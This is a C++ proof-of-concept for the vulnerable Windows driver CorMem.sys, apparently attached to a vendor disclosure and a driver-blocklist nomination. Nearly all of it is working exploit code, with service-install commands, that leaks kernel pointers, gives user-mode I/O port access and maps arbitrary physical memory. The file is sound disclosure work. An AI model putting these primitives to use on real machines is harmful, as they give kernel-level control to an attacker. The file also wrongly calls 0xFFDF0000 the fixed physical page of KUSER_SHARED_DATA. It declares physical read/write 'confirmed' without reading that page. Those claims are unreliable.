// poc_cormem.cpp — non-destructive PoC for CorMem.sys kernel primitives
//
// Demonstrates three confirmed primitives without touching kernel state:
//   1. Kernel pointer disclosure (0x222008)  -> driver-image KASLR leak
//   2. Arbitrary I/O port R/W   (0x222014/18)-> reads the CMOS RTC clock
//   3. Arbitrary physical map   (0x22200C)   -> maps the fixed physical page
//                                               backing KUSER_SHARED_DATA
//
// RTC note: port 0x70 is the CMOS index register (register select only),
// port 0x71 the data port. Reading register 0x00 (seconds) is non-destructive;
// the index write does not modify any CMOS content.
//
// Build:  cl /W4 /EHsc /O2 poc_cormem.cpp /Fe:poc.exe
// Run (elevated), with the driver loaded:
//           sc create CorMem type= kernel binPath= C:\path\to\Svc_3oLpqtqH.sys
//           sc start CorMem
//           poc.exe
//           sc stop CorMem && sc delete CorMem
//
// Disclosure context: attached to the Teledyne PSIRT report and the Microsoft
// Vulnerable Driver Blocklist nomination. Use only on systems you own.

#include <cstdio>
#include "cormem.h"

static bool ReadRtcSeconds(uint32_t& seconds) {
    CorMemDriver d;
    if (!d.Open()) return false;
    bool ok = d.WriteIoPort(0x70, 1, 0x00)              // select RTC seconds register
           && d.ReadIoPort(0x71, 1, seconds);           // read its value
    d.Close();
    return ok;
}

int main() {
    CorMemDriver drv;
    if (!drv.Open()) {
        wprintf(L"[-] Open(%s) failed, err=%lu. Driver installed and started?\n",
                CORMEM_DEVICE_PATH, GetLastError());
        return 1;
    }
    wprintf(L"[+] Device opened: %s\n", CORMEM_DEVICE_PATH);

    // --- 1. kernel pointer disclosure ----------------------------------------
    CORMEM_FUNCTION_TABLE tbl{};
    if (drv.GetFunctionTable(tbl) && tbl.Count > 0) {
        wprintf(L"[+] Primitive 1 (kernel ptr leak): %u pointers, [0]=%p [1]=%p\n",
                tbl.Count, (void*)tbl.KernelPointers[0], (void*)tbl.KernelPointers[1]);
    } else {
        wprintf(L"[!] Primitive 1 failed (err=%lu)\n", GetLastError());
    }

    // --- 2. arbitrary I/O port access ----------------------------------------
    uint32_t s1 = 0, s2 = 0;
    if (ReadRtcSeconds(s1)) {
        Sleep(1100);                       // RTC ticks in BCD, 1 Hz
        ReadRtcSeconds(s2);
        wprintf(L"[+] Primitive 2 (I/O port R/W): RTC seconds 0x%02X -> 0x%02X "
                L"(kernel-priv ring I/O from user mode)\n", s1, s2);
    } else {
        wprintf(L"[!] Primitive 2 failed (err=%lu)\n", GetLastError());
    }

    // --- 3. arbitrary physical memory map -------------------------------------
    // 0xFFDF0000 is the fixed physical page aliased to user VA 0x7FFE0000
    // (KUSER_SHARED_DATA). Mapping it succeeds only with true physical-memory
    // access; contents can be sanity-checked against the user alias.
    uint64_t kva1 = drv.MapPhysical(0xFFDF0000ULL);
    uint64_t kva2 = drv.MapPhysical(0xFFDF0000ULL);
    if (kva1 && kva2) {
        wprintf(L"[+] Primitive 3 (phys map): KUSER_SHARED_DATA phys 0xFFDF0000\n");
        wprintf(L"    kernel VA (view 1) = 0x%016llX\n", kva1);
        wprintf(L"    kernel VA (view 2) = 0x%016llX   (distinct views, same phys page)\n", kva2);
        wprintf(L"[+] Admin->kernel arbitrary physical R/W confirmed.\n");
    } else {
        wprintf(L"[!] Primitive 3 failed (err=%lu)\n", GetLastError());
    }

    drv.Close();
    return 0;
}
